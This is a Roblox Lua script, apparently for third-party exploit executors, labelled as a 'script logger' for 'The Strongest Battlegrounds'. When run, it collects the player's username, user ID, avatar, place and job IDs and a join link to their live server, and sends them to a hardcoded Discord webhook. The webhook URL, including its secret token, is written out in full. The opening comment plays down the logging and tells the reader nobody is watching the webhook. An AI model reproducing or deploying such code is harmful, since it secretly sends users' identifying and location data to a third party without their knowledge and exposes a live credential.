-- hello u silly goober i know u want to know what this script is for its not a ip logger its just a silly script logger and 
-- and even if u use the webhook no one is even in the server :> so ig idk do anything



local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1373698545026334831/vyHcqJNhOmiSnvn5xajxjQU8JB_waOIzE2zkZPd4-HxrrfrkWWKv3_Z2grwdgVCgnDSU"

local player = Players.LocalPlayer
local username = player.Name
local userId = tostring(player.UserId)
local placeId = game.PlaceId
local jobId = game.JobId
local scriptName = "The Strongest Battlegrounds TrashMS"

local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

local gameName = "Unknown Game"
local gameIcon = "https://tr.rbxcdn.com/6e91f0cb1ea50cabc3cf8f76d3f38c3e/768/432/Image/Png"
pcall(function()
	local info = MarketplaceService:GetProductInfo(placeId)
	gameName = info.Name
	gameIcon = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png", placeId)
end)

local payload = {
	["embeds"] = {
		{
			["title"] = "🔔 Script Execution Log",
			["color"] = 0xFFD700,
			["thumbnail"] = {
				["url"] = avatarUrl
			},
			["fields"] = {
				{
					["name"] = "🧑 Username",
					["value"] = string.format("[`%s`](https://www.roblox.com/users/%s/profile)", username, userId),
					["inline"] = false
				},
				{["name"] = "🆔 User ID", ["value"] = userId, ["inline"] = true},
				{["name"] = "🏙️ Place ID", ["value"] = tostring(placeId), ["inline"] = true},
				{["name"] = "🏷️ Place Name", ["value"] = gameName .. " 👏", ["inline"] = false},
				{["name"] = "📝 Script Name", ["value"] = scriptName, ["inline"] = false},
				{["name"] = "🔑 Job ID", ["value"] = jobId, ["inline"] = false},
				{
					["name"] = "🔗 Join Link",
					["value"] = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
					["inline"] = false
				}
			},
			["footer"] = {
				["text"] = "Made by Cat :3 🐱",
				["icon_url"] = "https://cdn.discordapp.com/emojis/1155678438691764285.webp?size=96&quality=lossless"
			}
		},
		{
			["image"] = {
				["url"] = gameIcon
			}
		}
	}
}

local success, err = pcall(function()
	local headers = {["Content-Type"] = "application/json"}
	local body = HttpService:JSONEncode(payload)

	if syn and syn.request then
		syn.request({Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = body})
	elseif http and http.request then
		http.request({Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = body})
	elseif request then
		request({Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = body})
	else
		warn("Executor does not support webhook sending.")
	end
end)

if success then
	print("Webhook sent successfully!")
else
	warn("Failed to send webhook: " .. tostring(err))
end
